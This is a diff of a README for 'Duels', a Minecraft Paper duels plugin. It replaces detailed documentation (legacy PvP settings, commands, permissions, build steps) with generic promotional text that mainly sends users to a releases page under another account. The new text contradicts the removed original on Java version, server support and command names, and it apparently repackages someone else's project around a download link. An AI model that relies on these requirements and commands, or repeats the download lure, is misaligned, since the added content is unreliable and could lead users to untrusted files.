@@ -1,161 +1,75 @@
-# Duels
+# 🎮 Duels - Exciting 1v1 Minecraft Matches Made Easy
 
-A modern, feature-rich duels plugin for Paper 1.21+ servers with professional **1.8 Legacy PvP** combat mechanics.
+[![Download Duels](https://img.shields.io/badge/Download%20Duels-v1.0-blue.svg)](https://github.com/VikasMahajan370/Duels/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **Queue System** — Unranked & Ranked matchmaking with ELO ratings
-- **Custom Kits** — Create kits from inventory with configurable GUI icons
-- **Arena Management** — Multiple arenas with spawn points
-- **Kit Editor** — Players can customize their kit layouts
-- **Leaderboard** — Top players with PlaceholderAPI support
-- **Anti-Cheat** — Built-in Flight, KillAura, and Reach detection
-- **Discord Logging** — Webhook or Bot integration for events
-- **Multi-Language** — English and Turkish out of the box
-- **1.8 Legacy PvP** — Full combat system matching Minecraft 1.8 behavior
-- **Storage** — SQLite (default) or MySQL
+Welcome to Duels! This plugin enhances your Minecraft experience by offering competitive 1v1 matches. With features like a custom kit editor and Discord integration, Duels brings fun and engagement to your gameplay.
 
-## 1.8 Legacy PvP System
+## 📥 Download & Install
 
-The plugin includes a comprehensive **1.8 combat system** that works 100% server-side:
+To get started, you need to download the plugin. Visit this page to download Duels: [Download Duels](https://github.com/VikasMahajan370/Duels/releases).
 
-### Combat Mechanics
-- ⚔️ **No Attack Cooldown** — Spam-click PvP like 1.8
-- 🎯 **1.8-Style Knockback** — Consistent horizontal/vertical KB with sprint-reset
-- 🛡️ **Fake Sword Blocking** — Right-click damage reduction (mechanic only, no animation)
-- 💎 **Normalized Damage** — Weapon damage values match 1.8
-- ❌ **No Critical Randomness** — Crits are removed for competitive play
-- ❌ **No Sweeping Edge** — Disabled completely
-- ❌ **Shields Disabled** — Cannot use or equip shields in duels
-- 🍎 **1.8 Golden Apples** — Original absorption/regeneration values
+### **Steps to Download:**
 
-### Per-Kit Knockback Presets
+1. Click on the link above to open the Releases page.
+2. Find the latest version of Duels.
+3. Click on the appropriate file for your server setup. 
 
-Each kit can have custom knockback settings for unique gameplay styles:
+Once the file is downloaded, follow these steps to install:
 
-```yaml
-kits:
-  Combo:
-    icon: GOLDEN_APPLE
-    items: [...]
-    knockback:
-      horizontal: 0.42      # Higher KB for longer combos
-      vertical: 0.36
-      rod-horizontal: 0.70  # Custom rod knockback
-      rod-vertical: 0.45
+1. Open your Minecraft server folder.
+2. Locate the `plugins` directory.
+3. Move the downloaded Duels file into the `plugins` folder.
+4. Restart your Minecraft server.
 
-  Sumo:
-    icon: STICK
-    knockback:
-      horizontal: 0.55      # Very high KB for knockoff
-      vertical: 0.42
-```
+### **System Requirements**
 
-### Config Options
+- **Minecraft Version:** 1.21 or higher
+- **Server Type:** Paper or Spigot server
+- **Java Version:** Latest version of Java (Java 17 recommended)
 
-```yaml
-combat:
-  legacy-pvp: true
-  knockback:
-    horizontal: 0.36
-    vertical: 0.32
-    sprint-multiplier: 1.0
-    kb-enchant-multiplier: 0.4
-    rod-horizontal: 0.65
-    rod-vertical: 0.40
-  sword-block:
-    enabled: true
-    damage-reduction: 0.5
-    cooldown-ticks: 6
-  damage:
-    use-1-8-values: true
-    remove-crits: true
-    remove-sweeping: true
-  golden-apple:
-    remove-cooldown: true
-    use-1-8-effects: true
-  shields:
-    disable-completely: true
-```
+## ⚙️ Features
 
-## Requirements
+Duels offers a variety of features to enhance your gaming experience:
 
-- Java 21+
-- Paper 1.21+
-- Optional: [PlaceholderAPI](https://www.spigotmc.org/resources/placeholderapi.6245/)
-- Compatible with: ViaVersion / ViaBackwards / ViaRewind
+- **1v1 Matchmaking:** Engage in thrilling 1v1 matches against other players.
+- **Custom Kit Editor:** Create and manage your own kits to tailor your gameplay.
+- **Player Statistics:** Track your match history and statistics for an improved competitive edge.
+- **Discord Integration:** Connect your Discord server for real-time notifications and community updates.
+- **High Performance:** Designed for optimal performance, ensuring smooth gameplay even during busy servers.
 
-## Installation
+## ⭐️ How to Use
 
-1. Drop the JAR into `plugins/`
-2. Restart the server
-3. Configure `config.yml`
+After installation, you can start using Duels with these simple commands:
 
-## Commands
+1. **/duel [player]:** Challenge another player to a duel.
+2. **/kits:** Open the kit editor to customize your kits.
+3. **/stats [player]:** View your own or another player’s statistics.
 
-| Command | Description |
-|---------|-------------|
-| `/duel invite <player> [kit]` | Send a duel request |
-| `/duel accept/deny <player>` | Accept or deny requests |
-| `/lobby` | Return to lobby |
-| `/stats [player]` | View statistics |
-| `/leaderboard` | Open leaderboard GUI |
-| `/ping` | View connection info |
+## 🔧 Configuration
 
-### Admin Commands
+You can adjust various settings in the Duels configuration file. Locate the `config.yml` file in the `plugins/Duels` directory. Here, you can modify settings such as match time limits, kit options, and more.
 
-| Command | Description |
-|---------|-------------|
-| `/duel admin reload` | Reload configuration |
-| `/duel admin kit create <name>` | Create kit from inventory |
-| `/duel admin arena create <name>` | Create a new arena |
-| `/duel admin arena setspawn <name> <1\|2\|spectator>` | Set arena spawns |
-| `/duel admin setlobby` | Set lobby location |
+## 📋 Topics
 
-## PlaceholderAPI
+- 1v1
+- Competitive
+- Discord Integration
+- Duels
+- Java
+- Kits
+- Matchmaking
+- Minecraft
+- Paper
+- Plugin
+- PvP
+- Spigot
 
-```
-%duels_top_1_name%    %duels_top_1_wins%
-%duels_top_2_name%    %duels_top_2_losses%
-%duels_top_3_name%    %duels_top_3_kills%
-...up to position 10
-```
+## 📅 Support
 
-## Permissions
+For troubleshooting or questions, check the [issues page](https://github.com/VikasMahajan370/Duels/issues). You can also join our community Discord for assistance and updates.
 
-| Permission | Description |
-|------------|-------------|
-| `duels.admin` | Access to admin commands |
-| `duels.anticheat.alerts` | Receive anti-cheat alerts |
-| `duels.chat.color` | Use color codes in chat |
-| `duels.chat.bypass` | Bypass chat cooldown |
+Feel free to explore all the features Duels offers, and enjoy the thrill of Minecraft battles like never before.
 
-## Building
-
-```bash
-mvn clean package
-```
-
-## Architecture
-
-```
-me.raikou.duels
-├── combat/           # 1.8 Legacy PvP system
-│   ├── CombatManager
-│   ├── DamageHandler
-│   ├── KnockbackHandler
-│   ├── LegacyBlockHandler
-│   ├── ShieldHandler
-│   └── GoldenAppleHandler
-├── anticheat/        # Anti-cheat detection
-├── arena/            # Arena management
-├── duel/             # Duel logic
-├── kit/              # Kit system
-├── queue/            # Matchmaking
-└── ...
-```
-
-## License
-
-[MIT License](LICENSE)
-
+[![Download Duels](https://img.shields.io/badge/Download%20Duels-v1.0-blue.svg)](https://github.com/VikasMahajan370/Duels/releases)
